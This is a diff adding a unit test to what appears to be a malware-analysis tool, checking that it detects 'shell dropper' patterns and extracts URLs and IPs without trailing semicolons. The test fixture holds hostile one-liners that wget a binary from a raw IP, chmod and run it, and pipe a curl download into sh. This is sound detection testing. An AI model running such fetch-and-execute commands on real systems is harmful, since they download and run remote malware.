@@ -47,6 +47,25 @@ beacon("kelvin654.duckdns.org");
         assert noise not in report.domains
 
 
+def test_shell_dropper_patterns_and_url_trimming():
+    text = "\n".join(
+        [
+            "cd /var",
+            "wget http://217.60.195.160/gigatex/arm; chmod 777 arm; ./arm gentech",
+            "curl http://217.60.195.160/gigatex/mips | sh",
+        ]
+    )
+
+    report = analyze_source_text(text, language_hint="bash")
+
+    categories = {finding.category for finding in report.findings}
+    assert "shell_dropper" in categories
+    # Trailing ';' must not bleed into the extracted URL.
+    assert "http://217.60.195.160/gigatex/arm" in report.urls
+    assert all(not url.endswith(";") for url in report.urls)
+    assert "217.60.195.160" in report.ips
+
+
 def test_recover_concatenated_strings_undoes_token_obfuscation():
     src = (
         'var v = "powXXer";\n'
